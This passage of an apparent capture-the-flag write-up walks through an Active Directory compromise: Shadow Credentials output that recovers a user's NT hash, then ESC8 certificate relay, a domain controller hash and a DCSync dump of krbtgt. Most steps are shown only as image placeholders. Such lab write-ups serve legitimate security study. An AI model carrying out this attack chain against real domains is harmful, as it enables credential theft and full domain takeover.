[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bbrown.ccache'
[*] Wrote credential cache to 'bbrown.ccache'
[*] Trying to retrieve NT hash for 'bbrown'
[*] Restoring the old Key Credentials for 'bbrown'
[*] Successfully restored the old Key Credentials for 'bbrown'
[*] NT hash for 'bbrown': 259745cb123a52aa2e693aaacca2db52
```

Authenticating with the recovered NT hash of the user:

{% image13 %}

### Domain Ownage - Privilege Escalation

The user `bbrown` is a member of `ADCS-READER`, which makes it worth enumerating the certificate templates and CA configuration this account can reach for any misconfiguration worth abusing:

{% image14 %}

The enumeration shows the CA is vulnerable to ESC8, where the web enrollment endpoint accepts NTLM authentication and allows a coerced machine account to be relayed into requesting a certificate on its behalf:

{% image15 %}

Authenticating with the resulting `dc01.pfx` certificate to recover the NT hash of the Domain Controller machine account:

{% image16 %}

Since the Domain Controller machine account holds DCSync rights over the domain, it can replicate directory secrets directly. Dumping the krbtgt account hash, which is the final flag for this machine:

{% image17 %}